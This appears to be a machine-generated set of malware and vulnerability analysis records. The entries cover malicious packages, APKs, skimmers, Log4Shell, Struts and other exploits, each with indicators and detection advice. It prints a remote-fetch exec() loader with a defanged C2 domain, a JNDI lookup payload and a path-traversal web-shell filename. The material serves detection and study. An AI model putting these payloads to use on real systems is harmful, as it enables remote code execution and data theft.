package_info.why_malicious: The report summarizes multiple threat campaigns and malware families (LockBit, Cl0p, ALPHV/BlackCat, Nobelium/Midnight Blizzard, Andariel/Lazarus, Triada, Rhysida, MuddyWater) but does not provide specific package names, package managers, or code artifacts. Instead, it describes attack techniques, vulnerabilities, and malware behaviors at a high level, including supply chain attacks, credential theft, privilege escalation, and remote code execution via exploitation of known vulnerabilities in widely used software and platforms.

malicious_snippets.code_snippet: Malicious code within a modified Telegram APK that installs the Triada Trojan, enabling subscription to paid services, in-app purchases, and credential theft.
malicious_snippets.code_behavior: At runtime, the code hooks into the Telegram app's authentication and purchase flows, intercepts login credentials, and silently initiates paid subscriptions and in-app purchases, resulting in financial loss and credential compromise.

malice_analysis.why_suspicious: The modified APK introduces hidden code that performs credential interception and unauthorized financial transactions, which are not present in the official Telegram app.
malice_analysis.violated_expectations: Legitimate messaging apps do not perform background subscription to paid services or exfiltrate user credentials without explicit user consent.
malice_analysis.similar_legitimate_use: In-app purchases and authentication flows are legitimate when transparently initiated and processed by the user within the official app.
key_indicators: APK signature mismatch from official Telegram release
Presence of additional permissions not required by the official app
Background network requests to known Triada C2 domains
Silent initiation of paid subscriptions and in-app purchases
Credential interception routines embedded in authentication flows

malicious_snippets.code_snippet: Exploit code targeting CVE-2023-3460 to create hidden admin accounts via crafted HTTP requests.
malicious_snippets.code_behavior: During exploit-time, the attacker sends specially crafted HTTP POST requests to the vulnerable registration endpoint of the Ultimate Member plugin, bypassing authentication controls and creating new admin accounts, which grants persistent unauthorized administrative access to the WordPress site.

malice_analysis.why_suspicious: The plugin's registration endpoint is abused to create admin accounts without authentication, which is a clear privilege escalation vector.
malice_analysis.violated_expectations: Normal plugin behavior requires authentication and proper authorization for admin account creation; unauthenticated users should not be able to escalate privileges.
malice_analysis.similar_legitimate_use: Admin account creation is legitimate only when performed by authenticated, authorized users through the official admin interface.
key_indicators: HTTP POST requests to /wp-admin/user-new.php or plugin registration endpoints without authentication
Creation of new admin users with anomalous registration details
Unexpected changes in the WordPress user database

execution_context.file_location: VMware Aria Operations for Logs (formerly vRealize)

malicious_snippets.code_snippet: Exploit code for CVE-2023-20864, leveraging insecure deserialization to achieve remote code execution.
malicious_snippets.code_behavior: During exploit-time, the attacker transmits a maliciously crafted serialized Java object to a vulnerable endpoint in VMware Aria Operations for Logs, which is deserialized and executed by the server, resulting in arbitrary remote code execution with the privileges of the application process.

malice_analysis.why_suspicious: The application deserializes untrusted data from network input, enabling attackers to execute arbitrary code on the server.
malice_analysis.violated_expectations: Secure applications validate and sanitize all serialized input before deserialization; untrusted data should never be deserialized directly.
malice_analysis.similar_legitimate_use: Deserialization is safe when used with trusted, internally generated data and proper input validation.
key_indicators: Inbound network traffic containing serialized Java objects to log management endpoints
Execution of unexpected processes or commands by the log server
Presence of exploit payloads matching known CVE-2023-20864 patterns

malicious_snippets.code_snippet: Exploit code for CVE-2023-31222 enabling remote code execution or denial-of-service via the Paceart Messaging Service.
malicious_snippets.code_behavior: During exploit-time, the attacker sends specifically crafted network packets to the Paceart Messaging Service, exploiting CVE-2023-31222 to trigger remote code execution or cause a denial-of-service condition, potentially disrupting medical device data management and availability.

malice_analysis.why_suspicious: The vulnerability allows unauthenticated remote code execution or service crash, which can compromise the integrity and availability of critical medical device data.
malice_analysis.violated_expectations: Medical device management interfaces should require strong authentication and input validation to prevent unauthorized access or service disruption.
malice_analysis.similar_legitimate_use: Remote management is legitimate when performed by authenticated, authorized personnel using secure protocols.
key_indicators: Unauthenticated network access to the Paceart Messaging Service
Malformed or unexpected protocol messages causing service crashes
Execution of unauthorized commands on the medical device management server

malicious_snippets.code_snippet: Exploit code leveraging JNDI injection in Log4j to achieve remote code execution.
malicious_snippets.code_behavior: During exploit-time, the attacker injects a malicious JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) into a log message processed by Log4j, causing the server to perform a remote lookup and execute code retrieved from the attacker's server, resulting in full system compromise.

malice_analysis.why_suspicious: JNDI lookups in log messages should not trigger remote code execution; this behavior enables attackers to execute arbitrary code via log input.
malice_analysis.violated_expectations: Logging libraries are expected to record data, not execute code based on log content, especially from untrusted sources.
malice_analysis.similar_legitimate_use: JNDI is intended for internal resource lookups, not for processing untrusted user input in log messages.
key_indicators: Log entries containing ${jndi:ldap://...} or similar patterns
Outbound LDAP/RMI connections initiated by the application server
Unexpected code execution following log message processing

package_info.why_malicious: The APK masquerades as a legitimate dating app but, upon installation and launch, collects sensitive user data (phone number, location, SMS messages, contacts) and exfiltrates it to a remote command-and-control (C&C) server. It also enables remote code execution by processing commands from the attacker, resulting in ongoing device compromise and privacy violations.

malicious_snippets.code_behavior: On application launch, the code collects the device's phone number, location, SMS messages, and contacts, then transmits this data to a hardcoded C&C server via network request, enabling exfiltration of sensitive information. Upon receiving remote commands from the C&C, the code executes arbitrary instructions, resulting in persistent attacker control.

malice_analysis.why_suspicious: The code systematically harvests sensitive user data (phone number, SMS, contacts, location) and sends it to an external server without user consent. It also allows the attacker to execute arbitrary code remotely, which is a hallmark of advanced mobile malware.
malice_analysis.violated_expectations: A legitimate dating app should only request permissions necessary for its stated features (e.g., location for matching nearby users) and must not access or transmit SMS messages, phone numbers, or contacts to unknown servers. It should never allow remote code execution or arbitrary command processing.
malice_analysis.similar_legitimate_use: Some dating apps may request location or contact access for user matching or inviting friends, but they do not bulk-exfiltrate this data or enable remote code execution. Access to SMS or phone state is rarely justified and should be clearly explained to the user.
key_indicators: Hardcoded C&C server communication for data exfiltration
Bulk access to SMS, contacts, phone number, and location
Dynamic execution of attacker-supplied commands
Requests for excessive permissions unrelated to dating functionality

detection_knowledge.how_to_detect: Monitor for Android applications that request excessive or sensitive permissions not aligned with their stated purpose. Analyze network traffic for connections to known or suspicious C&C infrastructure, especially immediately after app launch. Inspect APKs for code that collects and transmits user data or implements remote command execution functionality. Flag apps with obfuscated code and embedded C&C references for further review.

package_info.why_malicious: The package is malicious because it is intentionally crafted to lure users to phishing and scam domains through README links, with the explicit goal of harvesting credentials or personal information by promising 'free Robux' or 'Fortnite skins'. The package contains no functional or legitimate code and exists solely to promote scam websites, violating the expected purpose of software packages.

malicious_snippets.code_snippet: [FREE ROBUX ROBLOX GENERATOR 2022] How to get Roblox Free Robux Promo Codes Generator 2022 no Human Verification VISIT HERE https://freerobux.best ...
malicious_snippets.code_behavior: When the package is published and its README is rendered on the package registry or during installation, the README displays a hyperlink to a scam domain; this entices users to click the link, resulting in redirection to a phishing website where user credentials or personal information may be harvested.

malice_analysis.why_suspicious: The README includes direct links to domains known for phishing and scam activity, and makes fraudulent claims about free in-game currency, which is a common social engineering tactic for credential theft.
malice_analysis.violated_expectations: Legitimate package READMEs provide documentation, usage instructions, or links to official project resources, not to unrelated or scam domains making deceptive offers.
malice_analysis.similar_legitimate_use: Legitimate packages may link to official documentation or project homepages, but never to unrelated, non-official, or scam domains promising free in-game items.

README.md text includes fraudulent claims about free in-game currency or items

package_info.why_malicious: These packages are typosquats and starjacks of popular open-source libraries, containing hidden malicious code within commonly used functions. The code is designed to exfiltrate sensitive data (such as credentials and tokens) or enable remote code execution by fetching and executing attacker-controlled payloads when specific functions are called. The malicious logic is intentionally concealed to evade static and install-time security scans, only activating during runtime.

execution_context.trigger: At runtime, when the send_message function is called

malicious_snippets.code_snippet: import requests, base64; exec(base64.b64decode(requests.get('hxxps[:]//tg[.]aliyun-sdk-requests[.]xyz/telegram').text))
malicious_snippets.code_behavior: At runtime, when the send_message function is called, the code issues an HTTP GET request to a hardcoded external domain to retrieve a base64-encoded payload, decodes the payload, and executes it using exec(), resulting in remote code execution and potential exfiltration of sensitive data.

malice_analysis.why_suspicious: The code dynamically fetches and executes remote content from an attacker-controlled server at runtime, which is a classic remote code execution (RCE) technique. Embedding this logic in a commonly used function increases the likelihood of execution and user compromise.
malice_analysis.violated_expectations: A legitimate messaging library should never fetch or execute code from external sources during normal function calls. Core library functions should be deterministic and not introduce arbitrary code execution paths.
malice_analysis.similar_legitimate_use: Dynamic plugin systems may fetch code, but only from trusted, user-configured sources and never within core library functions without explicit user consent.
key_indicators: Use of exec() on content fetched from a remote server
Base64 decoding of network-fetched data prior to execution
Hardcoded command-and-control (C2) domain in source code
Malicious logic embedded in a high-frequency function

malice_analysis.why_suspicious: The code employs complex obfuscation techniques, such as bitwise operations, dynamic string construction, and non-ASCII variable names, to hide its true purpose and evade static analysis. malice_analysis.violated_expectations: Legitimate Python packages do not obfuscate basic operations or use convoluted logic for string/function construction, particularly in code that executes automatically upon import.
malice_analysis.similar_legitimate_use: Obfuscation may be used in proprietary or closed-source software to protect intellectual property, but it is not appropriate in open-source libraries, especially when used to hide import-time actions.

malice_analysis.violated_expectations: Legitimate packages do not install browser extensions or manipulate clipboard data for the purpose of redirecting sensitive information such as cryptocurrency wallet addresses.
malice_analysis.similar_legitimate_use: Clipboard monitoring may be used in accessibility or productivity tools, but not for the silent replacement of sensitive data with attacker-controlled values.

package_info.why_malicious: These packages impersonate the legitimate 'cli-width' package by copying its metadata and code, but introduce malicious logic that deploys and executes a disguised Mach-O binary ('travis.yml') on macOS systems during installation. The binary is dropped and executed in a hidden directory, attempts to establish persistence, and connects to an external command-and-control (C2) server to potentially download additional payloads. The packages also employ anti-forensics techniques by deleting installation traces and overwriting manifest files to hinder detection and analysis.

malicious_snippets.code_behavior: During postinstall, the code creates a hidden directory in the user's Application Support folder, copies a bundled file named 'travis.yml' (actually a Mach-O binary) to this directory as 'updateSafari', and executes it in the background using 'nohup', resulting in persistent execution of the malicious binary.

malice_analysis.why_suspicious: The code creates a non-standard directory in a sensitive user data location, copies and renames a file with a misleading extension to disguise its true nature, and executes it as a background process, all of which are classic malware persistence and evasion techniques.
malice_analysis.violated_expectations: Legitimate npm packages should not drop or execute binaries, especially not with misleading names or in user data directories. They should not perform postinstall actions unrelated to their stated functionality.
malice_analysis.similar_legitimate_use: Some legitimate installers may set up helper binaries, but these are typically well-documented, signed, and not disguised as configuration files or executed in this manner.
key_indicators: Creation of non-standard directory in '~/Library/Application Support/Safari Update'
Copying and renaming a file with a misleading extension ('travis.yml' as a Mach-O binary)
Execution of a binary using 'nohup' for background persistence
Use of a file named 'travis.yml' as an executable binary

malice_analysis.violated_expectations: Legitimate packages do not delete their own installation scripts after execution, as this impedes debugging and maintenance.
malice_analysis.similar_legitimate_use: Rarely, some legitimate one-time setup scripts may self-delete, but this is almost never seen in npm packages and is not standard practice.
key_indicators: Immediate deletion of installation script ('package-lock.js')

package_info.why_malicious: The Log4j package itself is not intentionally malicious, but it contains a critical vulnerability (Log4Shell, CVE-2021-44228) that allows remote code execution (RCE) by attackers. This flaw enables attackers to inject arbitrary code via crafted log messages, leading to full system compromise. The vulnerability is present in the log4j-core component, which processes log messages and can be exploited via JNDI lookups embedded in log data.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by the vulnerable Log4j library
execution_context.file_location: Any Java application using a vulnerable log4j-core JAR (typically in the application's classpath, e.g., /WEB-INF/lib/log4j-core-2.x.jar)
required_permissions: network access (to perform outbound LDAP/RMI/DNS requests)
JNDI access (Java Naming and Directory Interface)
ability to load and execute remote Java classes

malicious_snippets.code_snippet: ${jndi:ldap://attacker.com/a}
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the vulnerable Log4j library interprets the pattern, initiates a JNDI lookup to the attacker-controlled LDAP server, retrieves a remote Java class, and loads and executes it within the application process, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load executable code from remote servers, which is a direct remote code execution vector and a severe security risk.
malice_analysis.violated_expectations: Normal logging libraries should treat log message content as inert data and must not interpret or execute code, nor initiate network lookups based on log data. Executing code based on log message content is a fundamental violation of secure logging practices.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in some enterprise Java applications for resource discovery or configuration, but they should never be triggered by untrusted log message content. In the context of logging, such lookups are not expected or safe.
key_indicators: Presence of ${jndi:...} patterns in log messages or log files
Unexpected outbound LDAP, RMI, or DNS requests originating from application servers running Java
Java processes performing JNDI lookups to external or untrusted servers
Loading and execution of Java classes retrieved from remote servers via JNDI

network_indicators: Outbound LDAP, RMI, or DNS requests to external or untrusted servers from application infrastructure

detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns (e.g., ${jndi:ldap://, ${jndi:rmi://, ${jndi:dns://}), inspect network traffic for unexpected outbound LDAP, RMI, or DNS requests from Java application servers, and scan application dependencies for vulnerable log4j-core versions (2.0-beta9 through 2.14.1). Use intrusion detection systems to flag suspicious log message content and anomalous network behavior. Correlate log entries with network activity to identify exploitation attempts.

package_info.why_malicious: This report summarizes multiple advanced attack techniques and incidents, including ransomware, data breaches, and novel malware delivery methods. It does not focus on a specific package from a package manager, but instead details several distinct malicious behaviors and code execution strategies used in real-world attacks.

execution_context.file_location: Injected DLL placed in the same directory as a trusted executable (e.g., C:\Program Files\App\malicious.dll)
required_permissions: process_injection (to execute within trusted process context)

malicious_snippets.code_snippet: DLL side-loading technique: A malicious DLL is crafted with the same name as a legitimate dependency and placed alongside a trusted executable. When the executable is launched, it loads the attacker's DLL instead of the genuine one, executing attacker-controlled code within the trusted process context.
malicious_snippets.code_behavior: At process launch, the trusted executable loads the malicious DLL due to name/path hijacking, the DLL executes attacker-controlled payloads (such as establishing persistence, injecting further code, or initiating C2 communication), and the outcome is stealthy execution of malicious code under a trusted process identity.

malice_analysis.why_suspicious: DLL side-loading abuses the trust relationship between executables and their dependencies, allowing attackers to execute arbitrary code under the guise of a legitimate process, often bypassing security controls and evading detection.
malice_analysis.violated_expectations: Legitimate DLLs should not be replaced or injected with unauthorized code; trusted processes are expected to load only verified, untampered dependencies.
malice_analysis.similar_legitimate_use: Legitimate software may update or replace DLLs for patching or plugin purposes, but never to execute hidden or unauthorized payloads.
key_indicators: DLL file with the same name as a legitimate dependency but a mismatched hash or digital signature
Trusted process unexpectedly loading a DLL from a non-standard or writable directory
Unusual network or file system activity originating from the trusted process after DLL load
Presence of unsigned or suspiciously signed DLLs in application directories

execution_context.file_location: ReadyToRun (R2R) precompiled section of a .NET assembly (e.g., C:\inetpub\wwwroot\app.dll)

malicious_snippets.code_snippet: R2R stomping: Malicious code is injected into the ReadyToRun precompiled section of a .NET assembly, replacing legitimate compiled code while preserving valid assembly metadata and digital signatures. This allows the assembly to appear legitimate while executing attacker-supplied logic.
malicious_snippets.code_behavior: At .NET assembly load time, the runtime loads the R2R assembly, executes the injected malicious code in place of the expected logic, resulting in stealthy execution of attacker-controlled payloads while evading static analysis and signature-based detection.

malice_analysis.why_suspicious: R2R stomping is a sophisticated technique that hides malicious code within precompiled .NET binaries, making detection by traditional static analysis tools difficult and enabling attackers to bypass code integrity checks.
malice_analysis.violated_expectations: ReadyToRun assemblies are expected to contain only code compiled from the original, trusted source; any replacement or hidden payloads violate code integrity and trust.
malice_analysis.similar_legitimate_use: Legitimate use of R2R involves performance optimization, not code replacement or injection of hidden logic.
key_indicators: Discrepancy between assembly metadata and actual code behavior in R2R sections
Unexpected or anomalous execution paths within precompiled code
Difficulties in reverse engineering or decompiling the assembly due to obfuscation or tampering
Presence of non-standard or suspicious R2R sections in .NET binaries

malicious_snippets.code_snippet: Ransomware payload: The binary enumerates files on the victim's system, encrypts them using strong cryptographic algorithms (e.g., AES, RSA), deletes backups and shadow copies to prevent recovery, exfiltrates sensitive data to a remote server, and creates ransom note files demanding payment for decryption.
malicious_snippets.code_behavior: At ransomware binary execution, the code scans the filesystem for target files, encrypts them in place, deletes backups and shadow copies, exfiltrates selected data to an attacker-controlled server, and writes ransom note files to affected directories, resulting in loss of data access and extortion demand.

malice_analysis.why_suspicious: Simultaneous file encryption, backup deletion, data exfiltration, and ransom note creation are definitive indicators of ransomware activity, representing a severe threat to data integrity and availability.
malice_analysis.violated_expectations: Legitimate software should never encrypt user files without explicit consent, delete backups, or demand payment for data recovery.
malice_analysis.similar_legitimate_use: Encryption utilities may encrypt files with user approval, but do not delete backups or demand ransom.

package_info.why_malicious: The package contains a prototype pollution vulnerability in versions prior to 1.1.10, allowing attackers to manipulate JavaScript object prototypes by submitting specially crafted file upload requests. This can result in arbitrary property injection, remote code execution, or denial-of-service, posing a critical security risk in affected deployments.

execution_context.trigger: runtime (during HTTP file upload request processing)
execution_context.file_location: middleware code handling file uploads (e.g., index.js or main file of express-fileupload)

malicious_snippets.code_behavior: At runtime, the code iterates over all keys in the user-supplied req.body object and assigns each value to the req.files object, allowing attacker-controlled keys such as '__proto__' to be injected into the application's object prototype chain, resulting in prototype pollution and enabling arbitrary property injection.

malice_analysis.why_suspicious: This code is suspicious because it copies all user-supplied keys from req.body directly into req.files without any validation or filtering, enabling attackers to inject special keys like '__proto__' that can modify the global object prototype and compromise application integrity.
malice_analysis.violated_expectations: Normal file upload handlers should validate and sanitize user-supplied keys to prevent prototype pollution. Here, the absence of key filtering allows arbitrary keys, including those that can alter object prototypes, to be assigned directly.
malice_analysis.similar_legitimate_use: Legitimate code may copy properties from one object to another, but should always restrict or sanitize keys, especially when handling user input in web request contexts to prevent prototype pollution.
key_indicators: Use of for-in loop over user-controlled input (req.body)
Direct assignment of user-supplied keys to sensitive objects (req.files)
No key validation or sanitization before assignment
Ability to inject special keys like '__proto__' or 'constructor'

execution_context.trigger: runtime (when handling file path operations after upload)
execution_context.file_location: function parsing file path information (e.g., path parsing utility within the package)

malicious_snippets.code_snippet:
const filePath = req.body.path;
fs.readFile(filePath, ...);
malicious_snippets.code_behavior: At runtime, the code reads a file path directly from the user-supplied req.body.path and uses it in a filesystem read operation, allowing an attacker to supply arbitrary paths. When combined with prototype pollution, this can be exploited to manipulate application logic, potentially leading to remote code execution or denial-of-service.

malice_analysis.why_suspicious: Directly using user-supplied file paths in filesystem operations without validation is dangerous, especially when prototype pollution can alter the behavior of path resolution or introduce malicious properties.
malice_analysis.violated_expectations: Secure applications should validate and restrict file paths from user input to prevent unauthorized file access. Here, the path is used without any checks, increasing the risk of exploitation, especially in the presence of prototype pollution.
malice_analysis.similar_legitimate_use: Reading files based on user input is common in file upload handlers, but should always be restricted to safe directories and validated to prevent path traversal or injection attacks.
key_indicators: Direct use of req.body.path or similar user input in fs.readFile or other filesystem APIs
No validation or sanitization of file paths before use
Potential for prototype pollution to alter file path resolution logic

attack_chain.action: Attacker submits a file upload request with a specially crafted key such as '__proto__' in the request body, targeting the file upload handler.
attack_chain.leads_to: Prototype pollution of global objects, allowing attacker-controlled properties to be injected into the application's object prototype chain.

attack_chain.action: The polluted prototype alters application logic, such as file path parsing or other sensitive operations, by introducing malicious properties or behaviors.
attack_chain.leads_to: Potential remote code execution or denial-of-service through manipulation of file system operations or other critical application logic.

package_info.why_malicious: These packages exploit modern Python build backends (Hatch, PDM, Poetry) by embedding malicious code in build hook plugins, enabling arbitrary code execution during the wheel build process. This technique bypasses traditional static analysis and detection methods by executing code at build-time, even in the absence of setup.py, allowing attackers to perform unauthorized actions on the build host.

malicious_snippets.code_behavior: At wheel build-time (pre-build hook via Hatch), the code opens /private/tmp/flag.txt for writing, writes a marker string, and closes the file, resulting in unauthorized file creation outside the package directory.

malice_analysis.why_suspicious: The build hook executes arbitrary code that writes to a system directory outside the package scope during the build process, which is not required for legitimate package builds and can be leveraged for signaling, data exfiltration, or further compromise.
malice_analysis.violated_expectations: Standard build hooks should only manipulate files within the package directory or update package metadata. Writing to unrelated system locations like /private/tmp/flag.txt is a clear deviation from expected behavior.
malice_analysis.similar_legitimate_use: Legitimate build hooks rarely, if ever, write to system directories outside the package. In rare cases, a build might cache artifacts, but this would be documented and not target arbitrary system paths.
key_indicators: Arbitrary file write to /private/tmp/flag.txt during build
Execution of code via Hatch build hook (initialize method)
No user notification or consent for system file modification
Presence of hatch_build.py with custom BuildHookInterface implementation

malicious_snippets.code_snippet:
def pdm_build_hook_enabled(context):
    # Only enable for wheel builds
    return context.target == "wheel"

def pdm_build_initialize(context):
    # Code in this function will run before building
    with open("/private/tmp/flag.txt", mode="w", encoding="utf-8") as f:
        f.write("Malware could have run here")
malicious_snippets.code_behavior: At wheel build-time (pre-build hook via PDM), the code checks if the build target is 'wheel', then writes a marker string to /private/tmp/flag.txt, resulting in unauthorized file creation on the build host.

malice_analysis.why_suspicious: The build hook is configured to execute only for wheel builds and writes to a sensitive system location, which is unnecessary for normal package builds and can be used for signaling or malicious payload delivery.
malice_analysis.violated_expectations: Build hooks should only affect files within the package or its build artifacts. Writing to /private/tmp/flag.txt is not a standard or required operation for any legitimate build process.
malice_analysis.similar_legitimate_use: It is extremely rare for legitimate builds to write to /private/tmp. Such behavior would typically be documented and justified, not hidden in a build hook.
key_indicators: Conditional execution for wheel builds via pdm_build_hook_enabled
File write to /private/tmp/flag.txt during build
Custom pdm_build.py file implementing build hook logic
No user notification or documentation for system file modification

execution_context.file_location: BUILD.md (referenced as build hook in pyproject.toml)

malicious_snippets.code_behavior: At wheel build-time (Poetry build hook), the code in BUILD.md (a file with a misleading extension) writes a marker string to /private/tmp/flag.txt, demonstrating arbitrary code execution via a disguised build hook.

malice_analysis.why_suspicious: The use of a Markdown file (BUILD.md) to store and execute Python code as a build hook is intentionally deceptive. The code writes to a system directory, which is not required for any legitimate build process and is a clear indicator of malicious intent.
malice_analysis.violated_expectations: Build hooks should be clearly named Python files and only modify package files or metadata. Executing Python code from a .md file is a deliberate attempt to evade detection and mislead reviewers.
malice_analysis.similar_legitimate_use: There is no legitimate reason to place executable Python code in a .md file and reference it as a build hook. This is a clear abuse of the build system.
key_indicators: Executable Python code embedded in BUILD.md
BUILD.md referenced as a build hook in pyproject.toml
File write to /private/tmp/flag.txt during build
No user notification or documentation for this behavior

detection_knowledge.how_to_detect: Scan source distributions for the presence of custom build hook files (e.g., hatch_build.py, pdm_build.py, or files with misleading extensions like .md) and inspect pyproject.toml for suspicious build hook entries referencing these files. Monitor build processes for any filesystem writes outside the package directory, especially to system locations such as /private/tmp. Disallow or sandbox sdist installations where possible to restrict build-time code execution. Flag any build-time execution of code that modifies system files or performs undocumented actions. Review build hook logic for undocumented or unnecessary system interactions.

package_info.why_malicious: The injected code is a malicious JavaScript skimmer designed to steal customer payment data by intercepting and exfiltrating sensitive information entered on the checkout page. This is a classic example of Magecart-style attacks, where attackers exploit web platform vulnerabilities to inject code that harvests credit card and personal data.

malicious_snippets.code_behavior: When a user submits the checkout form, the code intercepts the form submission event, collects all form data including payment details, and sends this data via an HTTP POST request to an attacker-controlled external domain, resulting in exfiltration of sensitive customer payment information.

malice_analysis.why_suspicious: The code intercepts sensitive payment form submissions and exfiltrates the entire form data to an external, attacker-controlled domain, which is a definitive sign of a web skimming attack and is never legitimate on a payment page.
malice_analysis.violated_expectations: Legitimate e-commerce JavaScript should only transmit payment data to trusted payment processors or the merchant's own backend, never to unrecognized or unapproved third-party domains. Intercepting and sending full form data externally is a direct violation of PCI DSS and standard security practices.
malice_analysis.similar_legitimate_use: Legitimate scripts may send non-sensitive analytics or event data to third-party services, or transmit payment data to authorized payment gateways, but never full payment details or PII to unknown or untrusted domains.

package_info.package_versions: Struts 2.0.0 through 2.5.32 and 6.0.0 through 6.3.0.1 (as per CVE-2023-50164 advisories)
package_info.why_malicious: The affected versions of Apache Struts contain a critical vulnerability in the file upload mechanism, specifically within the MultiPartRequestWrapper component. This flaw allows attackers to manipulate file upload parameters, such as fileName, to perform path traversal attacks. As a result, attackers can overwrite arbitrary files on the server's filesystem, including application code or configuration files, which can directly lead to remote code execution. Unpatched deployments of these versions are at high risk of full system compromise.

execution_context.trigger: At runtime, during HTTP file upload request processing
execution_context.file_location: MultiPartRequestWrapper Java class (handles file uploads in Apache Struts)
required_permissions: network (if attacker uploads web shells or triggers callbacks)
environment_vars (if attacker leverages uploaded code to access environment variables)

malicious_snippets.code_behavior: At runtime, when processing an HTTP file upload request, the code retrieves the fileName parameter directly from user input, constructs a file path by combining the upload directory with this value, and writes the uploaded content to the resulting file path without sanitization, enabling attacker-controlled path traversal and arbitrary file overwrite.

malice_analysis.why_suspicious: The code directly uses a user-supplied fileName parameter to construct a filesystem path for writing uploaded files, without any sanitization or validation. This allows attackers to supply path traversal sequences (such as '../') to escape the intended upload directory and overwrite arbitrary files on the server, which is a well-known vector for remote code execution and privilege escalation.
malice_analysis.violated_expectations: A secure file upload handler should strictly sanitize and validate file names, ensuring that uploads are confined to a designated directory and cannot overwrite critical files. The actual behavior fails to enforce these constraints, allowing attacker-controlled file paths.
malice_analysis.similar_legitimate_use: Legitimate file upload features may allow users to specify file names, but only after thorough sanitization (removing path traversal characters, restricting extensions) and with enforced directory constraints to prevent writing outside the intended upload directory.
key_indicators: Direct concatenation of user-supplied fileName with server file paths
Absence of path sanitization or validation logic before file write
Ability to use '../' or similar sequences in fileName to traverse directories
File writes occurring outside the intended upload directory during upload operations

attack_chain.action: Attacker crafts a malicious HTTP file upload request with the fileName parameter containing path traversal sequences (e.g., '../../webapps/ROOT/shell.jsp').
attack_chain.leads_to: Arbitrary file overwrite on the server filesystem, including sensitive application or configuration files.

attack_chain.action: The vulnerable MultiPartRequestWrapper processes the upload and writes the file to the attacker-specified location, potentially overwriting application files or placing a web shell in a web-accessible directory.
attack_chain.leads_to: Remote code execution if the overwritten file is executable or interpreted by the server (e.g., a JSP web shell in the web root).

attack_chain.action: Attacker accesses the uploaded or overwritten file (such as a web shell) via HTTP, executing arbitrary code on the server.
attack_chain.leads_to: Full system compromise, data exfiltration, or further lateral movement within the environment.

behavioral_signatures: File uploads resulting in files being written outside the intended upload directory
HTTP requests to file upload endpoints with fileName or similar parameters containing '../' or other path traversal patterns
Unexpected creation or modification of application files (e.g., .jsp, .class, .properties) during file upload operations
Audit logs showing file write operations to sensitive directories (e.g., webapps/ROOT/) triggered by upload requests
file_indicators: Presence of uploaded files in web root or application directories (e.g., webapps/ROOT/)
Overwritten configuration or code files (such as .jsp, .xml, .properties) after file upload events
Unusual file names or extensions appearing after upload (e.g., shell.jsp, cmd.jsp, or files with attacker-supplied names)
Timestamps of critical files matching recent upload activity
network_indicators: HTTP POST requests to file upload endpoints with suspicious fileName parameters containing path traversal sequences
Subsequent HTTP GET/POST requests to newly created or modified files (potential web shells) in web-accessible directories
Outbound connections initiated by newly uploaded files (if a web shell is used for callbacks or command-and-control communication)
detection_knowledge.how_to_detect: Monitor file upload endpoints for requests containing path traversal patterns (such as '../') in fileName or similar parameters. Audit file system changes to detect files written outside the intended upload directory, especially in web root or application directories. Correlate upload events with subsequent access to new or modified files, particularly those with suspicious names or extensions. Use web application firewalls (WAFs) to block upload requests with path traversal patterns, and implement strict input validation on file upload parameters. Regularly review server logs for unexpected file write operations and monitor for the creation or modification of executable files in web-accessible locations.

package_info.why_malicious: The package contains a critical remote code execution (RCE) vulnerability (CVE-2017-9805) due to improper handling of XML payloads in the XStreamHandler class. Specifically, the createXStream method deserializes attacker-controlled XML without type whitelisting or input validation, enabling attackers to execute arbitrary code on the server by sending malicious XML documents to REST endpoints.

malice_analysis.why_suspicious: The code deserializes untrusted XML input directly using XStream without any type restrictions or validation, which is a well-known vector for remote code execution attacks. This allows attackers to craft XML payloads that instantiate arbitrary classes and trigger malicious behaviors.
malice_analysis.violated_expectations: Normal secure deserialization requires strict type whitelisting and input validation to prevent instantiation of arbitrary classes. The actual code omits these controls, allowing attacker-supplied XML to instantiate any class available in the classpath.
malice_analysis.similar_legitimate_use: Legitimate XML deserialization in REST APIs is common, but only when the input is from trusted sources and strict type controls are enforced. Secure implementations use XStream's allowTypes or similar mechanisms to restrict deserialization to safe classes.

malicious_snippets.code_behavior: At runtime, the code captures Facebook login credentials entered by the user into a custom login form, transmits the credentials via HTTP POST to an attacker-controlled external domain, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code directly accesses user-supplied Facebook credentials and sends them to a non-Facebook domain, which is a clear indicator of credential-stealing malware.
malice_analysis.violated_expectations: A legitimate photo editor app should never request or handle Facebook credentials directly, nor transmit them to any server other than Facebook’s official authentication endpoints via the official SDK.
malice_analysis.similar_legitimate_use: Legitimate apps may use Facebook login through the official SDK, which never exposes raw credentials to the app or transmits them to third-party servers.
key_indicators: Custom Facebook login form implementation instead of using official SDK
Direct access to user-entered email and password fields
Hardcoded external URL for credential exfiltration
HTTP POST requests containing credential data to non-Facebook domains

execution_context.trigger: runtime (after successful credential theft and token acquisition)
execution_context.file_location: Android app code, likely in a background service or ad management module (e.g., com.blenderphotoeditor.ads.FraudulentAdManager.java)

malicious_snippets.code_behavior: At runtime, after obtaining the victim’s Facebook session token, the code uses the stolen token to interact with Facebook’s ad management APIs, creating and running ad campaigns that charge the victim’s payment method without their consent.

malice_analysis.why_suspicious: The code leverages stolen Facebook tokens to programmatically create ad campaigns, resulting in unauthorized financial transactions and account abuse.
malice_analysis.violated_expectations: A photo editor app should not interact with Facebook’s ad management APIs or access user payment information for any purpose, especially without explicit user consent.
malice_analysis.similar_legitimate_use: Only official Facebook ad management tools or apps with explicit user authorization should create ad campaigns, and never using credentials or tokens obtained without user knowledge.
key_indicators: Use of Facebook API calls with tokens not obtained via official SDK
Automated creation of ad campaigns without user interaction
Access to or use of payment information linked to Facebook account
Background service activity related to Facebook ad management in a non-advertising app

attack_chain.action: User installs the malicious app and is prompted to log in with Facebook credentials via a custom login form.
attack_chain.leads_to: Credentials are intercepted and exfiltrated to an attacker-controlled server.

attack_chain.action: Stolen credentials are used to obtain a valid Facebook session token and access the victim’s Facebook account and associated payment information.
attack_chain.leads_to: Attacker creates and runs unauthorized ad campaigns, incurring charges to the victim’s payment method.

behavioral_signatures: Android apps implementing custom Facebook login forms that request credentials directly from users
Transmission of Facebook login credentials to external, non-Facebook domains during authentication
Background creation of Facebook ad campaigns using session tokens not obtained via official SDK flows
